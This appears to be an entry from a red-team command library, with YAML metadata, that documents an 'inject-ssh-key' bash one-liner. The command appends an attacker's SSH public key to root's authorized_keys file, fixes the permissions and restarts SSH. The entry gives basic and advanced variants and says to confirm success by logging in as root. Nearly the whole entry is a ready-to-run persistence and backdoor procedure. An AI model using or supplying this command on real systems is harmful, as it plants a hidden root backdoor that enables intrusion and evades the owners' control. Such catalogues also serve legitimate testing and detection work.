---
id: cmd-uuid-1
data: >-
  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3... attacker_pubkey' >>
  /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && service
  ssh restart
tags:
  - privilege-escalation
  - ssh
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.198Z'
verified: false
validated: true
submitted: true
---
# inject-ssh-key

## Command

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3... attacker_pubkey' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && service ssh restart
```

## Description

This command injects an attacker-generated SSH public key into the root user's authorized_keys file on a Linux system, sets proper permissions, and restarts the SSH service to enable immediate root access via key-based authentication. It is typically used in privilege escalation scenarios where command injection allows root-level execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ssh-rsa ...` | The full SSH public key string to inject | Yes |
| `/root/.ssh/authorized_keys` | Target file path (assumes root context) | Yes |
| `chmod 600` | Sets secure permissions on the file | Yes |
| `service ssh restart` | Reloads SSH to apply changes | Yes |

## Examples

### Basic Usage

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
```

### Advanced Usage

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && service ssh restart && echo 'Key injected successfully'
```

## Expected Output

No stdout if successful; the file is appended silently, permissions are updated, and SSH restarts without error. Verify by SSHing with the corresponding private key: successful login as root confirms execution.

## Related

- [[Related Procedure: Inject-Command-in-syslog-ng-Configuration]]
